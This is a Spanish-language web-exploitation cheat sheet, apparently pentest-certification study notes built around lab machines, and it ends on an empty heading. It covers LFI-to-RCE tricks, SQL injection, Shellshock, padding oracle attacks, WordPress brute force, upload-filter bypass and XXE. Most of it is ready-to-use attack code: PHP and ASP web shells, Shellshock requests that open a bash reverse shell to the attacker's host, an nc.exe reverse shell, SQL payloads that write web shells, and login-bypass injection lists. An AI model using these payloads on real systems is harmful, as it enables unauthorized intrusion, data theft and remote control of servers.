Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:

* Log Poisoning (access.log &amp; auth.log)
* Mail PHP Execution

La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.

En caso de serlo para la ruta _/var/log/auth.log_, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.

Esto en otras palabras se traduce en que por cada intento fallido de conexión por SSH hacia el sistema, se generará un reporte visible en el recurso _/var/log/auth.log_. La idea en este punto es aprovechar la visualización del recurso para forzar la autenticación de un usuario no convencional, donde incrustramos un código PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.

Ejemplo:

`ssh &quot;&lt;?php system('whoami'); ?&gt;&quot;@192.168.1.X`

Tras introducir una contraseña incorrecta para el usuario inexistente, se generará un reporte en el recurso _auth.log_ como el siguiente:

```bash
Nov  5 11:53:46 parrot sshd[13626]: Failed password for invalid user &lt;?php echo system('whoami'); ?&gt; from ::1 port 39988 ssh2
Nov  5 11:53:48 parrot sshd[13626]: Connection closed by invalid user &lt;?php echo system('whoami'); ?&gt; ::1 port 39988 [preauth]
```

Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cómo figurará un usuario '***www-data***' para el campo _whoami_ definido en el script php incrustrado a través del usuario de autenticación.

Para el caso del recurso _access.log_ pasa algo similar, sólo que en cuanto a la implementación técnica se realizarn otras operaciones.

Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso _auth.log_.

Otra de las técnicas para conseguir la ejecución de comandos a través de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodología paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).

La segunda de ellas [**Mail PHP Execution**], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '**/etc/passwd**', poder visualizar sus correspondientes mails en '**/var/mail/usuario**'.

Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos &quot;malformar&quot; un mensaje para insertar código PHP y posteriormente apuntarlo desde el navegador.

En caso de no llegar a saber qué usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:

```bash
smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X 
```

Obteniendo resultados similares al siguiente:

```bash
192.168.1.X: root exists
192.168.1.X: mysql exists
192.168.1.X: www-data exists
```

Ahora que sabemos que el usuario **www-data** existe, podemos hacer lo siguiente:

```bash
telnet 192.168.1.X 25

HELO localhost

MAIL FROM:&lt;root&gt;

RCPT TO:&lt;www-data&gt;

DATA

&lt;?php

echo shell_exec($_REQUEST['cmd']);
?&gt;
```

¿Qué tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sólo tendremos que hacer lo siguiente:

```bash
http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar
```

Y el navegador nos devolverá el output del comando aplicado a nivel de sistema.

#### LFI to RCE via PHP Sessions

Para este caso, comprobamos si el sitio web cuenta usa **PHP SESSION** (_PHPSESSID_):

```bash
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

En PHP, estas sesiones son almacenadas en la ruta '**/var/lib/php5/sess[PHPSESSID]**':

```bash
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:&quot;&quot;;loggedin|s:0:&quot;&quot;;lang|s:9:&quot;en_us.php&quot;;win_lin|s:0:&quot;&quot;;user|s:6:&quot;admin&quot;;pass|s:6:&quot;admin&quot;;
```

La idea es setear la Cookie a `&lt;?php system('cat /etc/passwd');?&gt;`:

```bash
login=1&amp;user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;&amp;pass=password&amp;lang=en_us.php
```

Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a través del LFI:

```bash
login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

#### LFI to RCE via Environ

Si por algún casual podemos visualizar el recurso **/proc/self/environ**, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:

```bash
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: &lt;?=phpinfo(); ?&gt;
```

#### LFI RFI Using Wrappers

##### Wrapper php://filter

```bash
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

Se puede jugar con otro wrapper de compresión en caso de contar con un archivo muy grande:

```bash
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

Así mismo, los wrappers también pueden ser encadenados:

```bash
php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
```

##### Wrapper zip://

```bash
echo &quot;&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

##### Wrapper data://

Este Wrapper nos permite ejecutar directamente código PHP:

```bash
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTA: El payload es &quot;&lt;?php system($_GET['cmd']);echo 'Tenemos Shell!'; ?&gt;&quot;
```

Otra forma:

```bash
http://example.com/index.php?file=data:text/plain;,&lt;?php echo shell_exec($_GET['cmd']);?&gt;
```

Otro payload interesante a tener en cuenta es el `&lt;?php phpinfo(); die();?&gt;`. La funcionalidad **die** previene la ejecución del resto del script o la ejecución de la extensión decodificada incorrectamente anexada a la secuencia.

Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga útil puede ser:

```bash
http://example.com/index.php?file=data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls
```

O también:

```bash
http://example.com/index.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls.
```

##### Wrapper expect://

```bash
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

##### Wrapper input://

Especificamos nuestro payload a través de un parámetro POST:

```bash
http://example.com/index.php?page=php://input
POST DATA: &lt;? system('id'); ?&gt;
```

También puede hacerse desde terminal de la siguiente forma:

```bash
$~ echo &quot;&lt;? system('id'); ?&gt;&quot; | POST http://example.com/index.php?page=php://input
```

##### Wrapper phar://

Crea un archivo **phar** con un objeto serializado en sus metadatos:

```bash
// create new Phar
$phar = new Phar('test.phar');
$phar-&gt;startBuffering();
$phar-&gt;addFromString('test.txt', 'text');
$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object-&gt;data = 'rips';
$phar-&gt;setMetadata($object);
$phar-&gt;stopBuffering();
```

Si llegados a este punto, cualquier operación es realizada en nuestro archivo Phar existente haciendo uso del wrapper **phar://**, entonces los metadatos serializados son deserializados y por tanto interpretados.

Si esta aplicación contase con una clase llamada **AnyClass** y tuviese los métodos mágicos **__destruct()** o **__wakeup()** definidos, entonces estos serían invocados automáticamente:

```bash
class AnyClass {
    function __destruct() {
        echo $this-&gt;data;
    }
}
// output: rips
include('phar://test.phar');
```

#### SQLI

Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3

Comprobamos que la web es vulnerable a inyección SQL:

`http://www.paginaweb.com/contenidos.php?Id=-1 `

Enumeramos hasta coincidir con el número de columnas para generar las etiquetas:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -`

Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, así como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -`

Comenzamos a enumerar las tablas de la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -`

Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rápida qué tablas existen sobre la base de datos, parseando para ello los resultados en función del caso que se nos presente:

```bash
for i in $(seq 1 200); do
    echo -n &quot;Para el número $i: &quot;
    curl --silent &quot;http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-&quot; | grep &quot;eltitulo&quot; | cut -d '&gt;' -f 2 | awk '{print $1}' FS=&quot;&lt;&quot;
done
```

Obteniendo resultados como los siguientes:

```bash
Para el número 63: CABECERA
Para el número 64: COLABORADORES
Para el número 65: CONTENIDOS
Para el número 66: DOCUMENTOS
Para el número 67: HORARIOS
Para el número 68: IDIOMAS
Para el número 69: IMAGENES
Para el número 70: MODULOS
Para el número 71: NOTICIAS
Para el número 72: PERMISOS
Para el número 73: USUARIOS
```

Una vez localizada la tabla que nos interese (para este caso, la tabla **usuarios**), enumeramos las columnas existentes para dicha tabla en la base de datos:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -`

Es necesario para este paso convertir la cadena **usuarios** de STRING a formato ASCII. Obtendremos los siguientes resultados:

`IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR`

Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad _group_concat_ para concatenar todas las columnas cuyos datos queramos visualizar:

`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-`

Obteniendo el usuario y contraseña de acceso.

Antes de complicarse, preferible probar inyecciones básicas sobre paneles de autenticación, esto es:

```bash
Usuario: admin' or 1=1-- -
Password: admin' or 1=1-- -
```

Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.

Para técnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)

En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas **sql** se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicaríamos la siguiente sintaxis a modo de ejemplo:

```bash
http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,&quot;&lt;?php echo
shell_exec($_GET['cmd']);?&gt;&quot;,6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,&quot;&lt;?php echo
shell_exec($_GET['cmd']);?&gt;&quot;,6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

A continuación, un Payload de pruebas a realizar para los logins una vez hagamos la convencional **' or '1'='1**:

```bash
-'
' '
'&amp;'
'^'
'*'
' or ''-'
' or '' '
' or ''&amp;'
' or ''^'
' or ''*'
&quot;-&quot;
&quot; &quot;
&quot;&amp;&quot;
&quot;^&quot;
&quot;*&quot;
&quot; or &quot;&quot;-&quot;
&quot; or &quot;&quot; &quot;
&quot; or &quot;&quot;&amp;&quot;
&quot; or &quot;&quot;^&quot;
&quot; or &quot;&quot;*&quot;
or true--
&quot; or true--
' or true--
&quot;) or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
&quot; or &quot;x&quot;=&quot;x
&quot;) or (&quot;x&quot;)=(&quot;x
&quot;)) or ((&quot;x&quot;))=((&quot;x

```

#### Shellshock

Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina **Shocker** y la máquina **Beep** de HackTheBox.

Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.

Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una página web. De existir, podemos buscar por archivos de extensión '**.cgi**', aunque no es extrictamente necesario... pues también podría tratarse de un archivo de extensión '**.sh**' y los efectos serían los mismos.

En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuación. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vía Netcat. En segundo lugar realizamos la siguiente petición desde terminal al servicio web:

```bash
$~ curl --silent -k -H &quot;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ipLocal/puertoLocal 0&gt;&amp;1&quot; &quot;https://192.168.1.X:10000/cgi-bin/recurso.cgi&quot; 
```

Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.

**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión

Otra opción es desde Burpsuite también, manipulamos el User-Agent para que figure el siguiente contenido:

```bash
User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/ip/puerto 0&gt;&amp;1
```

#### Padding Oracle Attack

Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la máquina **Padding Oracle** de _VulnHub_ y otra de ellas es la máquina **Lazy** de _HackTheBox_. Ambas máquinas se resuelven de la misma forma en cuanto a explotación de vulnerabilidad respecta, pudiendo tomar 2 vías de explotación.

La **primera vía de explotación** consiste en a través del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario **admin** definamos un nuevo usuario **admin=**. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario **admin**. 

La **segunda vía de explotación** consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticación como dicho usuario, pillando la Cookie de sesión desde la pestaña **Network** de la propia inspección de elemento o desde **Burpsuite**.

A continuación, utilizamos la herramienta **padbuster** para llevar a cabo el ataque de oráculo de relleno. Seguimos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0
```

Donde **D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km** es la Cookie de sesión y **8** el número de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle **for i in $(seq 1 100)** a fin de determinar el número de bloques, pues en caso de no ser correcto no se podrá aplicar la inyección.

La herramienta tiene cierta similitud al **sqlmap** para inyecciones SQL, sólo que aquí las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el número de bloques proporcionado es correcto.

Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:

```bash
[+] Decrypted value (ASCII): user=s4vitar
[+] Decrypted value (HEX): 757365723d733476697461720808080808080808
[+] Decrypted value (Base64): dXNlcj1zNHZpdGFyCg==
```

Con esto entre manos, lo que podemos hacer es generar desde **Padbuster** la Cookie de sesión válida para el usuario **admin** en base a la autenticación válida del usuario cuya Cookie hemos capturado.

Para ello, desde **Padbuster** aplicamos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0 --plaintext user=admin
```

Donde veremos que la herrmamienta directamente nos proporcionará la Cookie de sesión para el usuario administrador.

Lo único que tenemos que hacer ahora, es desde **Burpsuite**, interceptar una autenticación con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por **PadBuster**. Lo que conseguiremos con esto es acceder como el usuario **admin** al servicio web, burlando el panel de autenticación sin ser necesario conocer la contraseña de dicho usuario.

#### WordPress

Sobre este gestor de contenidos, la idea es verificar en primer lugar si a través del recurso _README.html_ podemos visualizar la versión del CMS. De esta forma, posteriormente desde **Searchsploit** podemos buscar vulnerabilidades para dicha versión.

En caso de no poder visualizar la versión, nos aprovechamos de la herramienta **wpscan** para a través de la siguiente sintaxis obtener el versionado del gestor:

```bash
$~ wpscan -u &quot;http://192.168.1.x&quot;
```

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo **/directorio-wordpress/**, deberemos especificarlo a través del parámetro **--wp-content-dir** para la correcta enumeración desde **wpscan**:

```bash
$~ wpscan -u &quot;http://192.168.1.x&quot; --wp-content-dir &quot;directorio-wordpress&quot;
```

En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:

```bash
$~ wpscan -u &quot;http://192.168.1.x&quot; --enumerate u
```

En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeración de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis sería la siguiente:

```bash
$~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x
```

Tras obtener usuarios válidos de autenticación, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:

```bash
$~ wpscan -u &quot;http://192.168.1.x&quot; --username usuario -w /usr/share/wordlists/rockyou.txt
```

Una forma de bypassear posibles bloqueos es jugar con el parámetro **--random-agent**, de la siguiente forma:

```bash
$~ wpscan -u &quot;http://192.168.1.x&quot; --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent
```

La herramienta **wpscan** es capaz de detectar los plugins instalados sobre el gestor, los cuales también pueden abrir un posible vector de ataque que permita la ejecución de comandos en remoto y variados. Sin embargo, por prevención siempre me gusta fuzzear los plugins haciendo uso del siguiente [recurso](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt) de SecList.

En caso de no obtener o poder enumerar usuarios válidos de autenticación, estos gestores de contenido suelen exponer el usuario propietario de los artículos o entradas que figuren expuestos sobre la página principal. De esta forma, podemos llegar a extraer usuarios válidos de autenticación simplemente visualizando quién es el autor de las entradas publicadas.

Teniendo un usuario válido de autenticación, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el **rockyou.txt**, suelo hacer uso de la herramienta **cewl** para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:

```bash
cewl -w diccionario http://192.168.1.x
```

Así mismo, una vez se logra acceder al gestor de contenidos, la intrusión al sistema es la parte más sencilla. Simplemente en la sección de Apariencia, en la pestaña Editor nos vamos al script **404.php** configurado para llevar a cabo una modificación, subiendo nuestro propio código PHP malicioso que permita entablarnos una conexión reversa contra el sistema.

Para apuntar a dicho script tenemos 3 vías:

* http://192.168.1.x/?p=404.php
* http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)
* http://192.168.1.x/404.php

#### PHP Reverse Shell Manual Multifuncional

La más típica de las ejecuciones vía PHP que nos podemos configurar es la siguiente:

```php
&lt;?php
	system('whoami');
?&gt;
```

Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar **system**, podemos usar **shell_exec**, más específico para la ejecución de comandos vía shell con retorno del output en formato string.

Esto se resume en la siguiente estructura:

```php
&lt;?php
	echo shell_exec('whoami');
?&gt;
```

En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:

```php
&lt;?php
	echo shell_exec($_REQUEST['cmd']);
?&gt;
```

De manera que podríamos elaborar desde la URL la siguiente petición:

`http://192.168.1.X/fichero.php?cmd=whoami`

A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vía web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar añadiendo unas etiquetas de preformateado en nuestro script:

```php
&lt;?php
	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
?&gt;
```

En caso de querer hacerlo **multifuncional**, podemos gestionar la variable proporcionada desde el usuario que hace la petición, donde para el caso presentado a continuación, además de ejecutar comandos a través de la variable '_fexec_', creamos una nueva variable '_fupload_' para la transferencia de archivos desde nuestra máquina local a la máquina remota en el directorio de trabajo:

```php
&lt;?php
	if(isset($_REQUEST['fexec'])){
		echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['fexec']) . &quot;&lt;/pre&gt;&quot;;
	};
	
	if(isset($_REQUEST['fupload'])){
		file_put_contents($_REQUEST['fupload'], file_get_contents(&quot;http://127.0.0.1:8000/&quot; . $_REQUEST['fupload']));
	};
?&gt;
```

De esta forma, el usuario que hace las consultas podría efectuar cualquiera de las siguientes 3 operaciones:

* http://192.168.1.X/fichero.php?fexec=whoami
* http://192.168.1.X/fichero.php?fupload=script.php 
* http://192.168.1.X/fichero.php?upload=script.php&amp;fexec=php+script.php

Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.

#### ASP ASPX Reverse Shell

Habiendo citado ya una forma de entablar una conexión TCP reversa a través de un fichero .asp/.aspx generado desde Metasploit, otra vía en caso de que la primera no funcione, es crear un archivo con dicho contenido:

```bash
&lt;%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
Call oS.Run(&quot;C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122&quot;,0,True)
%&gt;
```

Habiendo previamente subido el binario **nc.exe**, con esto conseguiremos que de ser interpretado vía web el script, se nos entable una reverse shell por el puerto 1122 vía Netcat gracias a la ejecución del binario previamente alojado.

#### x-jenkins

En caso de que el servicio web corra un **Jenkins**, de manera inmediata se comprobará si existe el recurso **/script/** sobre el servicio. En caso de existir, el servicio es vulnerable a ejecución remota de comandos gracias al script de consultas interactivas que podemos crear desde ahí.

Para ello, deberemos definir las siguientes líneas de consulta:

```bash
cmd = &quot;whoami&quot;
cmd.execute().text
```

Tras enviar la consulta, veremos el Output de la ejecución a nivel de sistema del comando proporcionado.

#### Bypass File Upload Filtering

Una de las técnicas típicas además del **Null Byte Injection** y las de **Content-Type**, es la de doble extensión. Esto es simplemente renombrar nuestro script php a _shell.php.jpg_. 

Listo a continuación otros formatos aceptados en función del lenguaje que se utilice:

**php** phtml, .php, .php3, .php4, .php5, and .inc
**asp** asp, .aspx
**perl** .pl, .pm, .cgi, .lib
**jsp** .jsp, .jspx, .jsw, .jsv, and .jspf
**Coldfusion** .cfm, .cfml, .cfc, .dbm

En caso de analizar el **Content** en la subida de archivo, podemos bypassearla de la siguiente forma:

```bash
GIF89a;
&lt;?
system($_GET['cmd']);
?&gt;
```

Otra vía alternativa es a través de imágenes, haciendo uso de **exiftool** para insertar metadatos. Para ello, sobre una imagen válida, aplicamos el siguiente comando:

```bash
exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' imagen.jpg
```

Posteriormente, es necesario renombar el archivo **imagen.jpg** a **imagen.php.jpg**. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable **cmd** posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.

Otra técnica bastante chula, consiste en subir un archivo **.htaccess**. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.

Nuestro archivo **.htaccess**, tendría el siguiente contenido:

```bash
Add-Type Application/x-httpd-php .miextension
```

De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensión **.miextension**, será interpretado como un archivo PHP.

#### XML External Entity Injection

Para practicar podemos jugar con las máquinas **Aragog** y **DevOops** de **HackTheBox**. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrás a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:

```bash
User: s4vitar
Password: myPassword
```

Esto ha sido así dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son **User** y **Password**, así como una etiqueta principal **creds** que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describiré a continuación. 

En un principio, estaríamos enviando el siguiente archivo XML:

```bash
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
    &lt;creds&gt;
       &lt;User&gt;s4vitar&lt;/user&gt;
       &lt;Pass&gt;myPassword&lt;/pass&gt;
    &lt;/creds&gt;
```

Conociendo por tanto la estructura, podríamos decidir enviar un contenido como el siguiente:

```bash
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
   &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
    &lt;creds&gt;
       &lt;User&gt;&amp;xxe;&lt;/user&gt;
       &lt;Pass&gt;myPassword&lt;/pass&gt;
    &lt;/creds&gt;
```

A la hora de listar el Output desde la web, nos encontraríamos con el siguiente resultado:

```bash
User: www-data
Password: myPassword
```

Esto ha sido así dado que estamos jugando con el _wrapper_ **expect**. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podríamos probar a leer archivos de la siguiente forma:

```bash
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
   &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
    &lt;creds&gt;
       &lt;User&gt;&amp;xxe;&lt;/user&gt;
       &lt;Pass&gt;myPassword&lt;/pass&gt;
    &lt;/creds&gt;
```

Donde tal y como se podrá predecir, en el campo **User** se listará el contenido del fichero **/etc/passwd**. Una idea aquí es visualizar si para algunas de los usuarios existentes en base a la visualización del recurso anteriormente visto, bajo el directorio **.ssh** podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificación, de esta forma... lograríamos acceder al sistema sin proporcionar contraseña alguna.

Otro ejemplo práctico así como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrás con la siguiente estructura:

```bash
&lt;?php 
    libxml_disable_entity_loader (false); 
    $xmlfile = file_get_contents('php://input'); 
    $dom = new DOMDocument(); 
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom); 
    $user = $creds-&gt;user; 
    $pass = $creds-&gt;pass; 
    echo &quot;You have logged in as user $user&quot;;
?&gt; 
```

Como es de obviar, se nos pide una estructura XML como la siguiente:

```bash
&lt;creds&gt;
    &lt;user&gt;Ed&lt;/user&gt;
    &lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
```

En este caso varía un poco la petición, pero podemos hacerla desde terminal:

```bash
$~ curl -d @xml.txt http://localhost/xml_injectable.php 
```

El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:

```bash
You have logged in as user Ed
```

Y a raíz de esto, podemos elaborar una estructura XML maliciosa como la siguiente:

```bash
&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;creds&gt;
    &lt;user&gt;&amp;xxe;&lt;/user&gt;
    &lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
```

¿Qué conseguimos con esto?, obtener lo siguiente:

```bash
$~ curl -d @xml.txt http://localhost/xml_injectable.php 

You have logged in as user root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```

#### PHP CGI Exploitation

